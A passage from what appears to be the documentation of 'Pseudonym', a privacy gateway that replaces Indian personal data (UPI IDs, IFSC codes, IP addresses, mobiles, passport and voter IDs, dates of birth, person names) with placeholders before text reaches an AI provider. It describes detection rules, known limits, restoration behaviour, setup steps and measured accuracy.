two never claim the same text.

### A mobile number in a UPI ID

`<mobile>@ybl` is one UPI ID, not a phone number plus leftover text: the
phone detector never takes digits glued to `@`. A mobile written with a
space (`<5 digits> <5 digits>@ybl`) is covered whole. In a payment link
(`upi://pay?pa=<id>&…`) only the ID is taken.

### What is not found

- A name at an unknown handle with no keyword nearby.
- The handle of `<mobile>@<unknown handle>` with no keyword: the mobile
  digits are replaced (as a number), the `@handle` is sent.
- `<mobile>.<name>@<unknown handle>`, even with a keyword: only the mobile
  is replaced (a known limit, open for Phase 5c).
- The payee name in a payment link (`pn=…`): names are Phase 6.

### The same ID twice

Compared without case: `<NAME>@OKAXIS` and `<name>@okaxis` in one request
are one placeholder, restored the first way it was written.

## IFSC codes (Phase 5b, 2026-10-01)

An IFSC (Indian Financial System Code) is the 11-character code of a bank
branch that NEFT, RTGS and IMPS transfers need: four letters for the bank,
a zero, six letters or digits for the branch (`SBIN0` followed by six
more). Each one becomes `[IFSC_1]`, `[IFSC_2]`… and is restored in the
answer. The code is `src/detection/ifsc.ts` (ADR-025).

An IFSC is public (RBI publishes every one) and names a branch, not a
person. Pseudonym redacts it because it is almost always written next to
someone's account number and says where they bank.

### Known bank code: always found

If the first four letters are one of the 260 bank codes on Pseudonym's
list, the IFSC is found wherever it is, with no keyword needed. The list is
every bank with branches in RBI's list of NEFT-enabled branches (updated
2026-09-15), taken from Razorpay's open-source copy of RBI's files because
RBI's own files could not be downloaded. It includes old codes of merged
banks (Andhra Bank, Vijaya Bank…).

### Any other four letters: only with a keyword

A product code can have the same shape, so an IFSC with an unknown bank
code is taken only when one of these words is within 40 characters: IFSC,
IFS code, NEFT, RTGS, IMPS, branch, आईएफएससी, शाखा. "Bank" is not one.

### Case

Any case: `sbin0001234`, `Sbin0001234` and `SBIN0001234` are the same code,
found the same way, and one placeholder in one request (restored the first
way it was written).

### Next to other values

| Text                                                | Found as                                                           |
| --------------------------------------------------- | ------------------------------------------------------------------ |
| `IFSC SBIN0001234, A/c <account number>`            | one IFSC, one number                                               |
| `SBIN0001234 1234 5678 9012` (digits after a space) | one IFSC covering all of it (over-redaction)                       |
| `password: SBIN0001234`                             | IFSC (the value is redacted either way)                            |
| `<ifsc>@okaxis`, `<ifsc>@example.com`               | one UPI ID, one email: an IFSC touching `@` is part of the address |
| `<ifsc>.x@example.com`                              | only the IFSC; `.x@example.com` is sent (known limit, 5c)          |
| `api_key=<ifsc>-x7`                                 | only the IFSC; `-x7` is sent (known limit, 5c)                     |

### What is not found

- An IFSC with an unknown bank code and no keyword nearby.
- A letter O in place of the zero (`SBINO001234`).
- A space or hyphen after the bank code (`SBIN 0001234`, `SBIN-0001234`).
- An IFSC glued to letters or digits (`IFSCSBIN0001234`).

### Measured

On the generated set: 153 of 153 IFSCs redacted, all as IFSC. 6 of 30
IFSC-shaped product codes were redacted too (each one near an IFSC
keyword); 0 of 32 batch codes and 0 of 23 invoice numbers that are one
character off. Held-out: 3 of 3.

(Those were the numbers on 2026-10-01 before the IP part. The IP part
added lookalikes to the generated set, which changes which value lands in
which sentence; on the new set one IFSC with an unknown bank code sits in
a pasted record whose `IFSC` column name is more than 40 characters away,
so it is missed by design and the row reads 152 of 153. The README has the
current numbers.)

## IP addresses (Phase 5b, 2026-10-01)

An IP address (IPv4 such as `203.0.113.5`, IPv6 such as `2001:db8::1`)
becomes `[IP_1]`, `[IP_2]`… and is restored in the answer. The code is
`src/detection/ip.ts`, a parser written for Pseudonym (no library),
ADR-026.

An address is personal data because the internet provider can tell whose
connection used it and when. So public addresses are redacted, and so are
private ones (`10.x`, `172.16–31.x`, `192.168.x`, `fd…`), carrier-grade
NAT (`100.64–127.x`), link-local (`169.254.x`, `fe80::…`) and the
documentation ranges used in examples.

### Left as written

Addresses no single host owns are the same on every machine and say
nothing about anyone:

- `0.0.0.0` and the rest of `0.x` (also Cisco wildcard masks like
  `0.0.0.255`), `::`;
- loopback: `127.0.0.1` and all of `127.x`, `::1`;
- multicast: `224.x` to `239.x`, `ff00::/8`;
- the reserved `240.x` to `255.x`: the broadcast address and every
  netmask (`255.255.255.0`).

No other detector may take one of these for something else either (the
SSDP multicast address passes the Aadhaar checks, and `255.255.255.0`
reads as a phone number), unless the detection runs on past it: then
both are redacted together.

### Only the address

| Written as                 | What the model sees                              |
| -------------------------- | ------------------------------------------------ |
| `203.0.113.5:8080`         | `[IP_1]:8080`                                    |
| `10.0.0.0/8`               | `[IP_1]/8`                                       |
| `http://203.0.113.5/login` | `http://[IP_1]/login`                            |
| `[2001:db8::1]:443`        | `[[IP_1]]:443`                                   |
| `fe80::1%eth0`             | `[IP_1]%eth0`                                    |
| `::ffff:203.0.113.5`       | `[IP_1]` (the same placeholder as `203.0.113.5`) |
| `IPv4 203.0.113.5`         | `IPv4 [IP_1]`                                    |

The same address written two ways (`192.168.001.010` and `192.168.1.10`,
`2001:DB8::1` and `2001:db8:0:0:0:0:0:1`) is one placeholder, restored the
first way it was written. If the model writes `http://[IP_1]/admin` in its
answer, the placeholder stays: values are never restored inside a URL.

### Found only with a keyword

Four numbers right after a version word ("version 2.4.1.12", "build",
"firmware", "संस्करण"…) and IPv6 made only of one- or two-digit groups
(`a::b`, eight pairs like `40:17:23:ff:fe:95:61:08`) are taken only when
"IP", "IPs", "IPv4", "IPv6", "inet", "inet6" or "आईपी" is within 40
characters. A version glued to "v" (`v2.4.1.12`) is never an address. A
version with no word in front cannot be told from an address and is
redacted.

### Next to other values

| Text                                                            | Found as                                                |
| --------------------------------------------------------------- | ------------------------------------------------------- |
| `Server 203.0.113.100 down` (also a valid Pune landline)        | IP                                                      |
| a 12-digit address that passes the Aadhaar checks               | IP                                                      |
| `password: 10.1.2.3`                                            | IP, whole                                               |
| `10.1.2.3@example.com`                                          | one email                                               |
| `10.1.2.3 4567` (digits after a space)                          | one IP covering both (over-redaction)                   |
| `10.1.2.3 10.4.5.6` (two addresses, a space between)            | two placeholders, the space kept between them (ADR-028) |
| `inet 203.0.113.9/24` (address and prefix also read as a phone) | one PHONE covering `203.0.113.9/24` (known limit)       |
| `api_key=10.1.2.3-x7`                                           | only the address; `-x7` is sent (known limit, 5c)       |

### What is not found

- An address inside a host name (`203.0.113.5.nip.io`, reverse-DNS names).
- An address glued to letters (`x10.1.2.3`) or with a fifth part
  (`10.1.2.3.4`).
- MAC addresses: not a type Pseudonym detects.

### Measured

Generated set, 2026-10-01: 153 of 153 addresses redacted, 149 as IP (the
other 4 are address + prefix read as a phone). 53 over-redactions by IP:
17 link-local and 14 private addresses (on purpose), 20 versions with no
word in front, 2 EUI-64 ids near an IP keyword. Loopback, netmasks,
multicast, times, dates, MAC addresses and versions after a version word
were not touched by IP. Held-out: 2 of 2.

## Mobiles in two groups of five, beside other digits (Phase 5c, 2026-10-01)

People write a mobile as two groups of five (`98xxx xxxxx`). The phone
library reads a stretch of digit groups joined by spaces as one number,
and if the whole stretch is not a valid number it finds nothing inside
it. So until Phase 5c a mobile with any other digits beside it was sent as
written: `Room 3 <mobile>`, `<mobile> 411038`, `Helpline <mobile> 24x7`,
two mobiles side by side, and every mobile of a contact sheet (a name or
label, then two mobiles per row). Since then
`src/detection/spaced-mobile.ts` looks inside such a stretch (ADR-027).

### What counts

Two neighbouring groups of exactly five digits, inside a longer stretch,
that together make a valid Indian number starting 6, 7, 8 or 9 (the mobile
ranges). A stretch that is only the mobile is still the phone library's.
The usual glue rules apply: not straight after a letter, digit, `@` or `+`.

### Tables of numbers

Tables of 5-digit amounts make such pairs by accident. So each line's
digit groups are numbered from the start of the line (every group counts,
even a lone digit or the `91` of `+91`), and a pair is checked against
every other line that has two 5-digit groups in the **same two
positions**:

- if all of them are mobiles too (a contact sheet), the pair is redacted,
  keyword or not;
- if any of them is not (an amount table), the pair is redacted only with
  a phone word nearby ("mobile", "phone", "call", "contact", मोबाइल…).

A line without two 5-digit groups there (a date, an address with a PIN
code, an Aadhaar, an amount written with commas) does not count. Every
kind of line break ends a line: LF, CRLF, CR, U+2028, U+2029.

| Written as                                                        | Result                                            |
| ----------------------------------------------------------------- | ------------------------------------------------- |
| `Room 3 <mobile> is my number.`                                   | redacted (with the `3`, one digit run)            |
| `<mobile> <mobile>`, `<mobile>-<mobile>`                          | both redacted, each its own placeholder (ADR-028) |
| a contact sheet, 2 or more rows, two mobiles per row              | every mobile redacted                             |
| the same with one row starting `+91`, or one row missing a mobile | every mobile redacted                             |
| `Jan 12345 67890 23456` rows with one row holding a mobile pair   | that pair only with a phone word nearby           |
| `65,000 72,000` or `1,25,000` amounts                             | nothing (commas break the groups)                 |

### What it costs

In tables of 5-digit amounts, some amounts are redacted though they are
not mobiles (measured on 200 synthetic tables per layout, detections in
text with nothing personal, before → after): row number + two amounts
116 → 149; three amounts per row 4 → 43; the same with some labels like
`Q1` 5 → 130 (68 of the 200 tables); two rows of three amounts 1 → 151;
two rows of a row number and two amounts 25 → 80. Two 5-digit amounts per
row were already read as a phone before (763, unchanged). The user sees
the real numbers in the reply either way.

### What is still not found

- Two values of other types side by side (an email after `-`, an IFSC
  next to an IPv6 address…): bug-log 35, Phase 5c items 2 and 3.

### Measured

Generated set: main cases unchanged. Shape block: digit-beside 13 → 40
of 40, side-by-side 68 → 80 of 80, contact-sheet 0 → 120 of 120,
misaligned-sheet 12 → 132 of 132. Held-out set: unchanged.

## Two values in one stretch of digits (Phase 5c, 2026-10-01)

Every detection is widened to the whole stretch of digits it touches, so
that no part of a longer number is left visible (ADR-010). Since ADR-028
that widening stops where the next value starts:

| Written as                             | Result                                                                                                           |
| -------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `<mobile> <Aadhaar>` (a space between) | two placeholders, `[PHONE_1] [AADHAAR_1]`                                                                        |
| `<mobile> 7 <Aadhaar>`                 | the `7` goes with the mobile; the Aadhaar has its own placeholder                                                |
| `10.1.2.3-10.1.2.9`                    | `[IP_1]-[IP_2]`                                                                                                  |
| `<IFSC> 2001:db8::…`                   | both redacted (before, the IFSC was sometimes lost)                                                              |
| `<mobile> - <mobile>`                  | sometimes still one placeholder for both: the overlap rule can prefer a reading across the `-` (Phase 5c item 3) |
| `<number>-<number>`, both unbroken     | one generic NUMBER (the safety net joins across hyphens; item 3)                                                 |

Still open (bug-log 35, item 3): an email, UPI ID or JWT right after
another value and a hyphen is sent; rarely, a number followed by `. ` or
`-` and an IPv6 address reads as a card number reaching into the
address, and the rest of the address is sent.

## Phone numbers after "…1234X" (bug-log 36, fixed 2026-10-01)

The phone library reads an "x" (or "xt", "ext") right after a digit as the
start of an extension, and then found nothing in a spaced number written
after it: `<PAN ending in X> 98xxx xxxxx`, `Room1X 022 2xxx xxxx`. Such a
marker is now blanked in the copy of the text the library searches, like a
standalone "x" or "ext" since bug 7. An "x" between digits (`24x7`) or
before an extension's digits (`…6789x123`) is left alone.

## When readings overlap (Phase 5c item 3, 2026-10-01, ADR-029)

Several detectors can read the same text. The order of what decides:

1. A checked value (Verhoeff, Luhn, a known handle…) beats an unchecked one.
2. Then the reading with more letters and digits; spaces, dots and hyphens
   do not count, so a window across `<mobile> - <mobile>` is not "longer".
3. Then the type order (IP, Aadhaar, card, PAN, IFSC, phone, UPI, email,
   secret, number).
4. A reading that wholly contains the winners it touches replaces them.
5. Every other reading that lost keeps what no winner covers.

| Written as                                    | Result                                                                                                       |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| `<PAN>.x@example.com`, `<IFSC>.x@example.com` | one email                                                                                                    |
| `api_key=<IFSC>-x7`, `token: abc-<mobile>`    | one secret                                                                                                   |
| `UPI <mobile>.<name>@<unknown handle>`        | one UPI ID                                                                                                   |
| `<mobile>(12345`, `<mobile>+123`              | the phone, and the joined digits as a number; the bracket or `+` stays text                                  |
| `<Aadhaar>-name@example.com`                  | the Aadhaar, then the email from `name`                                                                      |
| `a@example.com-b.c@example.org`               | both covered; the split may fall inside the first address                                                    |
| `<key>-<key>`                                 | one secret                                                                                                   |
| `<value>-eyJ…` (a JWT)                        | the value, and the JWT                                                                                       |
| `<Aadhaar>. 2001:db8::…`                      | both covered (a card reading may take the Aadhaar and the address's first group; the address keeps the rest) |

Nothing of either value is sent in any of these; a placeholder may cover a
split the writer did not intend. Still not covered: a lone digit and a
space before a long number (`1 23456789(12345` leaves `1`).

## Numbers wrapped onto the next line (Phase 5c item 4, 2026-10-02, ADR-030)

A mail client or a narrow chat window can put a line break inside a number.
Two digit runs on neighbouring lines are read as one number when only this
is between them: up to two spaces, dots or hyphens, one LF or CRLF, up to
two spaces.

| Written as                                               | Result                                                                |
| -------------------------------------------------------- | --------------------------------------------------------------------- |
| `2345 6789`, newline, `0123` (passes the Aadhaar checks) | one Aadhaar, line break included                                      |
| `234567`, newline, `890123` (passes the checks)          | one Aadhaar                                                           |
| a card `#### ####`, newline, `#### ####`                 | one card                                                              |
| the same with a typo                                     | a card only with "card", "debit"… nearby                              |
| `Room 3 2345 6789`, newline, `0123`                      | still one Aadhaar (the window takes the end of the first line)        |
| `98765`, newline, `43210`                                | nothing, unless "mobile", "call"… is nearby: then one phone           |
| `Flat 12`, newline, `<mobile>`, "mobile" nearby          | the mobile only; the flat number stays                                |
| `+1`, newline, `202-555-0143`, "call" nearby             | one phone, country code included (without a keyword: the number only) |
| `234567`, newline, `890123 7`                            | **not found** (unspaced, with a number beside it: known gap)          |
| two halves with a blank line between                     | not joined: two numbers                                               |

Within a line nothing changes. Where a wrapped value contains something
already found on one line (an Amex's first line reads as a landline), the
wrapped value wins and covers both lines. The placeholder replaces the
line break too; restoring puts it back. A wrapped phone and the same phone
on one line get one placeholder.

Cost: lists of short codes (two or three 4-digit codes per line) and lists
of 6-digit numbers one per line are sometimes redacted, because the end of
one line and the start of the next can pass the Aadhaar or card checks.
The README lists the measured numbers.

## Passport numbers, voter IDs and dates of birth (Phase 5c item 5, 2026-10-02, ADR-031)

Three short identifiers, each found **only with a word naming it within 40
characters** (before or after). Their shapes alone are not enough, because
the same shapes are everywhere in ordinary business text:

| Type            | Shape                  | Words that count                                                                                       | Placeholder    |
| --------------- | ---------------------- | ------------------------------------------------------------------------------------------------------ | -------------- |
| Passport number | a letter and 7 digits  | passport, passports, पासपोर्ट                                                                          | `[PASSPORT_1]` |
| Voter ID (EPIC) | 3 letters and 7 digits | voter, voters, EPIC, मतदाता, वोटर                                                                      | `[VOTER_1]`    |
| Date of birth   | a real calendar date   | DOB, D.O.B., birth (date of birth, birth date), birthdate, birthday, born, जन्म, जन्मतिथि, janm, janam | `[DOB_1]`      |

Dates are found in these forms: `07/03/1991`, `07-03-1991`, `7.3.1991`,
`07/03/91` (day first, or month first when only that reading is a real
date), `1991-03-07` (year first), `7 March 1991`, `07-Mar-1991`,
`7th March, 1991`, `March 7, 1991`. "Real" means the day exists in that
month (no 30 February; 29 February only in a leap year) and a four-digit
year is between 1900 and 2099. The code is `src/detection/passport.ts`,
`voter.ts` and `dob.ts`; the words are in `context.ts`.

Upper and lower case are the same passport or voter ID (one placeholder).
A date of birth is one value however it is spaced or capitalised, but
`07/03/1991` and `7 March 1991` are two values: `03/07/1991` means a
different day to different writers, so Pseudonym does not turn dates into
a calendar key.

A model that rewrites `[PASSPORT_1]` as `PASSPORT_1` or `Passport_1` still
gets the value back. `Passport 1`, `Voter 1` and `DOB 1` are left as
written: they are ordinary text ("Passport 1 of 2").

| Text                                            | Result                                   |
| ----------------------------------------------- | ---------------------------------------- |
| `Passport no: <number>`                         | one PASSPORT                             |
| `Model <letter and 7 digits> is back in stock.` | nothing                                  |
| `Voter ID: <ID> Order: ORD<7 digits>`           | two VOTER (the order code is the cost)   |
| `DOB: <date> Joined: <date>`                    | two DOB (the joining date is the cost)   |
| `I ordered it on <date> at 14:35.`              | nothing                                  |
| `DOB: <date>-<Aadhaar>`                         | one DOB and one AADHAAR; nothing visible |

What is not caught: any of the three with no word naming it nearby (by
design); a passport number with a space after its letter; voter IDs in
the older state formats; a date without its year, with spaces around a
numeric date's separators (`07 / 03 / 1991`), with a time glued to it
(`1991-03-07T10:00`), or with a month named in another language.

### Measured

Generated set, shape block `short-id` (153 of each type among codes and
dates of the same shapes): 305 of 459 redacted, before 1. With the right
type: passport 93, voter ID 103, date of birth 108. The misses are in
sentences that name no type, by design. 25 over-redactions, all codes or
dates within 40 characters of a real value's keyword. A probe of 200
messages per layout found nothing redacted in invoice lines, order mails
and log lines without such a word, and the neighbouring code or date
redacted every time with one (ADR-031 has the table).

## What restoration leaves as a placeholder: the echo measurement (Phase 5d part 3, 2026-10-02, ADR-033)

Restoration safety (Phase 2, Phase 4a) keeps some placeholders as they
are: inside a URL, a markdown link or image target, after `[label]:`, in a
quoted HTML attribute, after an unclosed `<` target or `="`, and before a
host name. Each one is a value the user does not get back. `npm run eval`
now measures how often, in the best case: every message of both datasets
is redacted and then restored as if the model had repeated it word for
word.

The **echo table** has one column per part (generated main cases, the
`in-markup` shape, the other shapes, the held-out set) and one row per
rule. "Messages back exactly" restores with the safety rules switched off
and compares with the message the user wrote; a value written twice in
two ways comes back in its first form (the "later mention" row), and
anything else would be a bug ("not restored correctly", 0 today).

What it showed on 2026-10-02:

- ordinary text loses almost nothing: 7 of 1,667 placeholders in the
  generated main cases, all IP addresses inside `http://…/login`;
- values written inside a URL, a link target or an HTML attribute stay
  placeholders, as intended: 66 of 98 in the `in-markup` shape;
- an email inside a URL's query or path was detected together with the
  URL's host and path (bug-log 49): no leak, but the model saw
  `https:[EMAIL_1]` instead of the URL. Fixed the same day (ADR-034): an
  address's local part now stops at `/`, `=` and `?`, so the address is
  taken alone and `in-markup` keeps 72 of 98 placeholders (26 restored).
  The price: an address that really has one of those characters before
  its `@` (`a/b@example.com`, legal but never issued) is redacted only
  from the character after it, and `a/` is sent;
- digits joined by a bracket (`1234567890(12345`) become
  `[NUMBER_1]([NUMBER_2]`, and the second stays a placeholder because
  `](` looks like a link;
- the held-out set (counts only): 4 of 70 left, 2 in a quoted HTML
  attribute and 2 in a URL.

For code that restores answers itself: `restore(text, mapping, options,
counts)` and `new StreamRestorer(mapping, options, counts)` take an
optional `RestoreCounts` (`emptyRestoreCounts()`) and add to it; the
restored text is the same with or without it. The gateway never passes
one.

## What a real model does with placeholders (Phase 5d part 4, 2026-10-02, ADR-017)

Measured once with the demo model, `qwen3:4b-instruct-2507-q4_K_M`, on
Ollama 0.35.0: 15 tasks, each asking the model to repeat every value it
was given, sent twice (placeholder instruction on, then off), temperature
0, a fixed seed. 34 values per setting: a small sample.

| Instruction | Values | Restored | Held back by safety | Rewritten | Dropped | Invented |
| ----------- | ------ | -------- | ------------------- | --------- | ------- | -------- |
| On          | 34     | 30       | 0                   | 0         | 4       | 0        |
| Off         | 34     | 32       | 2                   | 0         | 0       | 0        |

So the instruction is now **off by default**
(`PSEUDONYM_PLACEHOLDER_INSTRUCTION=false`); set it to `true` to try it
with another model. Without it the model often writes `EMAIL_1` without
brackets, which restoration reads. Code such as `API_KEY = "[SECRET_1]"`
keeps its placeholder: a quoted value after `=` counts as an HTML
attribute for restoration safety.

To run the measurement again (Ollama running, the model pulled; about 4
minutes on this machine):

```powershell
npx tsx scripts/measure-rewrites.ts --model qwen3:4b-instruct-2507-q4_K_M --answers $env:TEMP\rewrite-answers
```

It rewrites `eval/model-rewrites.json` (counts and placeholder forms only)
and puts the model's raw answers, which hold placeholders only, in the
`--answers` folder. Thinking models are not recommended: `qwen3:4b` takes
minutes per answer on a CPU, and with `reasoning_effort: "none"` its
reasoning lands in the answer itself.

## Phase 6b step 3 — person names in the request path (2026-10-03)

(As written at step 3. Names became usable in step 4b: see "Person names", below.)

Names are wired into the gateway, but **the name model is not built in
yet**, so names cannot be used: with `PSEUDONYM_NAMES=true` the gateway
refuses to start (`NameStartupError`, `NAME_MODEL_LOAD_FAILED`). With it
unset or `false`, nothing changes, with one exception: text you type that
already looks like a person placeholder (`[PERSON_1]`, `[person 2]`) is now
treated like every other placeholder-shaped text: it goes out as
`[LITERAL_1]` and comes back exactly as you typed it.

What names on will do (ADR-037):

- Before anything is sent, the name finder reads every piece of your
  request's text (each message, then each stop sequence) and finds the
  names in it. They are replaced like every other value:
  `[PERSON_1]`, `[PERSON_2]`, and restored in the answer, streamed or not.
  The same name written in another case or spacing is one placeholder;
  "Asha" and "Asha Rao" are two.
- A name written more than one way comes back in the form it first
  appeared, so its capitalisation or spacing can change in the answer.
  Every other type works the same way (an email, PAN, card number, UPI ID,
  IP address or date of birth), except secrets, which never share a
  placeholder across case and so always come back exactly as written.
- If the names cannot be found, the request is refused with a 503
  (`name_detection_unavailable`) and **never sent without them**: the
  model failed, did not answer in time, is busy with too many requests, or
  has crashed. After a crash every request is refused and `GET /health`
  answers 503 `{"status":"unhealthy"}` until the gateway is restarted; it
  does not restart the model by itself. Health is also 503 while the model
  is still busy with a call that has run past the timeout (nothing can be
  served meanwhile), and ok again when that call ends.
- The model's restoration rules are the usual ones: `[PERSON_1]` in any
  case and `PERSON_1` / `Person_1` are restored; `Person 1` is not (it is
  ordinary English).

`GET /health` exists with names off too, and answers 200 `{"status":"ok"}`.

Two leaks found in this step were fixed the same day (bug-logs 58 and
59), with names on or off: a value glued to text shaped like a placeholder
(`password: [PAN_1]xyz789!`) used to be sent whole and is now redacted
around the placeholder (`password: [LITERAL_1][SECRET_1]`); and part of a
value that shared one written character with a neighbouring value after
normalisation (an email right after a `½` that a card number took) is no
longer dropped.

## Phase 6b step 4a — the name runtime and the model files (2026-10-07)

(As written at step 4a. Names became usable in step 4b: see "Person names", below.)

Names still cannot be used: the part that runs the model is not built yet
(step 4b), so `PSEUDONYM_NAMES=true` still refuses to start. What exists now
is how the runtime and the model get onto a machine, and the checks that
make sure they are the ones that were measured (ADR-036).

**The runtime** (`onnxruntime-node` 1.30.0, `@huggingface/tokenizers`
0.2.0) is an optional dependency, pinned exactly. `npm install` and
`npm ci` install it (about 302 MB on Windows); with names off it is never
loaded. To run the built gateway without it, install with
`npm ci --omit=optional --omit=dev` after `npm run build`. Do not use
`--omit=optional` for a development checkout. It omits every optional
package, including the platform binaries of the build and test tools, and
esbuild's install script then fetches its own binary with a separate
`npm install` of its own: a download that is not in `package-lock.json`,
so no integrity hash checks it, and the checkout ends up running code
nothing verified. That is the reason not to use it. The visible symptom
is only that Vitest then does not start (rolldown's binary is gone too,
and nothing fetches it back). The production form above is not affected:
with `--omit=dev` too, esbuild is not installed at all.

**The model files** come from `npm run fetch:model`:

```bash
npm run fetch:model                                  # into models/
npx tsx scripts/fetch-model.ts --dir D:/somewhere     # another root
npx tsx scripts/fetch-model.ts --from <base URL>      # a mirror of the same files
```

It downloads four files (178.5 MB in all) from a pinned commit of
`Xenova/bert-base-multilingual-cased-ner-hrl` into
`models/Xenova__bert-base-multilingual-cased-ner-hrl@263e82c06569/`, and
keeps each one only if its size and SHA-256 match the pinned values. On a
mismatch it deletes the download, prints the file's name and both hashes,
and exits with code 1. Files already in place and correct are kept. It
prints the model's licence first: the repository states none; it is a
conversion of Davlan's model (AFL-3.0), a fine-tune of Google's
multilingual BERT (Apache-2.0); ADR-036 lists the open points.

**At start-up with names on**, the gateway checks, in this order, and
refuses to start (exit code 1, one line on stderr) at the first that fails:

| Check                                        | Refusal (`code`)           | Also logged |
| -------------------------------------------- | -------------------------- | ----------- |
| The name list is the measured one            | `NAME_LIST_MISMATCH`       |             |
| Each model file is present (a regular file)  | `NAME_MODEL_FILE_MISSING`  | `file`      |
| Each model file has the pinned size and hash | `NAME_MODEL_FILE_MISMATCH` | `file`      |
| The model loads (step 4b)                    | `NAME_MODEL_LOAD_FAILED`   |             |

For example:
`{"fatal":{"name":"NameStartupError","code":"NAME_MODEL_FILE_MISSING","file":"config.json"}}`.
The fix for the two file refusals is `npm run fetch:model`. The gateway
looks for the model under `models/` in the directory it is started from.
Hashing the files takes about 0.2 s at start-up. With names off, none of
this runs.

## Person names (Phase 6b, 2026-10-07; ADR-035, ADR-036, ADR-037)

Names are **off by default**. With them off, a name in a message is sent
to the provider as written. Turn them on only if you accept what they
cost: they are slow, and they wrongly redact some ordinary words.

### Turning them on

1. Install the default way (`npm install` or `npm ci`): the runtime
   (`onnxruntime-node` 1.30.0, `@huggingface/tokenizers` 0.2.0) comes as an
   optional dependency, about 302 MB on Windows. `--omit=optional` leaves
   it out; with names on, the gateway then refuses to start. **On Linux
   x64**, install with `ONNXRUNTIME_NODE_INSTALL=skip` set (as CI does):
   without it the runtime's install script also downloads about 273 MB of
   GPU provider libraries from NuGet, which names never load (measured,
   ADR-036).
2. `npm run fetch:model`: four files, 178.5 MB, from a pinned commit of
   `Xenova/bert-base-multilingual-cased-ner-hrl`, each kept only if its
   SHA-256 matches (licence: the step 4a section above).
3. Set `PSEUDONYM_NAMES=true` and start the gateway.

At start-up the gateway checks the name list, then the model files, then
starts the model in a worker thread of its own. If any of them fails it
does not start: one line on stderr and exit code 1, with the codes in the
step 4a table above (`NAME_MODEL_LOAD_FAILED` when the runtime is missing
or the model does not load). Starting takes about 1.1–1.7 s more than with
names off on a laptop CPU. The first start after an install can take over
10 s, names on or off (bug-log 66): allow for it in anything that waits for
the gateway.

### How a name is found

Two finders, joined: a multilingual named-entity model (B in ADR-035,
run on your machine; text never leaves it for this) and a list of given
and family names from Wikidata (F, 718 spellings, Latin and Devanagari).
The model's guesses are kept when it is very sure (0.9 or more), or fairly
sure (0.6 or more) with a word nearby that introduces or addresses a
person ("name", "Mr", "Dear", "Hi", "Regards", and their Hindi and
romanised Hindi equivalents). Each name becomes `[PERSON_1]`,
`[PERSON_2]`… and is restored in the answer, streamed or not, like every
other value. Names are never validated, so any validated value (a card
number, an IFSC code with a known bank) wins where the two overlap.

### What is found, measured

Measured on an **Intel Core i5-12450H**: on the generated set's 612-name
block **501 found (81.8%)**; in the main cases 145 of 153. On the held-out
set, run once: **41 of 45**. On that CPU every name the gateway finds on
the generated set is exactly what the measurement found: `npm run
eval:names` checks it, span by span. So does an AMD EPYC 7763; an Intel
Xeon Platinum 8573C and an Intel Xeon 6973P-C each find the same one name
more ("Which platforms the figures hold on", below).

### What is not found

- About one name in five on the generated set (111 of 612) and 4 of 45
  on the held-out set.
- **Names in all lower case**: almost never (3 of 59).
- **A name broken by an invisible character** (a soft hyphen or a
  zero-width space inside it) is covered to the end of the word only when
  the model or the list found part of that word; a second word of the
  name is not reached that way (ADR-036, option 2).
- "Asha" and "Asha Rao" in one conversation are two values with two
  placeholders: nothing links a first name to a full name.

### What it takes that is not a name

About 5.85 words in every 1,000 of ordinary text on the generated set
(about one in 170), and words that look like names: on the generated set
most often names of deities (17), places (12), companies (8) and festivals
(6). **Public figures are names and are redacted**, so a question about a
well-known person reaches the provider with a placeholder in place of the
name; there is no allowlist. Over-redaction is a cost to the answer's
quality, not a leak: the value comes back in the answer.

### When names cannot be found

The request is refused with a 503 (`name_detection_unavailable`) and is
**never sent without them**: the model failed, did not answer in time, has
too many requests waiting, or has crashed. The model works on one request
at a time; others wait in a queue.

- A request that runs past the timeout gets its 503, but the model
  finishes the work: a call cannot be interrupted (bug-log 68). Meanwhile
  `GET /health` answers 503 `{"status":"unhealthy"}` and other requests
  wait or are refused; health is ok again when the call ends.
- After a crash every request is refused and health stays unhealthy until
  the gateway is restarted; it does not restart the model itself.

### Settings (read only with names on)

| Variable                     | Default | What it does                                                                                                    |
| ---------------------------- | ------- | --------------------------------------------------------------------------------------------------------------- |
| `PSEUDONYM_NAMES_TIMEOUT_MS` | 202000  | How long a request may wait for its names, queued and running together. Past it: 503, never sent without names. |
| `PSEUDONYM_NAMES_MAX_QUEUE`  | 8       | How many requests may wait while the model works on another. More: 503 at once. 0 means none wait.              |

The timeout's default is derived, not picked: the largest request the
default body limit allows (256 KiB of text) at the slowest speed ever
measured (526 ms per KiB) takes 134.6 s, and 202 s is that with a margin
of 1.5. **If you raise `PSEUDONYM_MAX_BODY_BYTES`**, raise this timeout in
proportion, and know that the model then works for longer on one request
than anything measured, with no way to stop it (ADR-037). The queue's 8 is
a choice: it bounds how many requests wait, not how long.

### What it costs

Measured through the gateway on a laptop (Intel i5-12450H, no GPU; three
runs): about 0.31–0.33 s per KiB of request text, so about 0.14 s added to
a 1 KiB request, 1.1 s to 4 KiB, 5 s to 16 KiB and 21 s to 64 KiB, before
the request is sent; about 290 MiB more memory while idle and up to about
370 MiB while working.

### Checking it yourself

`npm run test:names` runs the name tests against the real model (it
fails, rather than skipping, without the model), and `npm run eval:names`
sends the 1,998 generated messages the published figures were measured on
through the gateway and checks that it finds exactly the same names. Both
need the model. On GitHub they run in the **Names** workflow, started by
hand (Actions → Names → Run workflow); it fetches the model, or restores
it from a cache that is checked file by file, so a broken cache fails the
run and never changes what is found (ADR-036, Phase 6c).

### Which platforms the figures hold on

The figures were measured on an **Intel Core i5-12450H** under Windows 11
x64. Under a rule written and committed before any Linux run (ADR-036),
the same comparison, span by span:

- **gave exactly the same names** on the i5-12450H under Linux (Debian 12
  in a container, 4 logical CPUs against Windows' 12), and on a GitHub
  runner's **AMD EPYC 7763**, a different vendor's CPU;
- **differed slightly** on another runner's **Intel Xeon Platinum 8573C**,
  running the same Linux as the EPYC: 502 of 612 found (82.0%) against 501
  (81.8%), 934 detections against 933, precision 70.8% and false positives
  5.85 per 1,000 words in both. One more detection, and it is a correct
  name;
- **differed in exactly the same way** on a fourth runner's **Intel Xeon
  6973P-C**: the same names, byte for byte, as the Xeon Platinum 8573C.

So four CPUs give two answers: the two without AVX-512 (the i5-12450H and
the EPYC 7763) agree with each other, and the two with AVX-512 and AMX
(the two Xeons) agree with each other. The code, the model and every other
pinned input were the same, and the operating system is ruled out (the
EPYC and the 8573C ran the same one). The likely reason: the runtime picks
its compute kernels by the instructions the CPU has. That explanation
predicted the 6973P-C's result before it was looked at, and held; it is
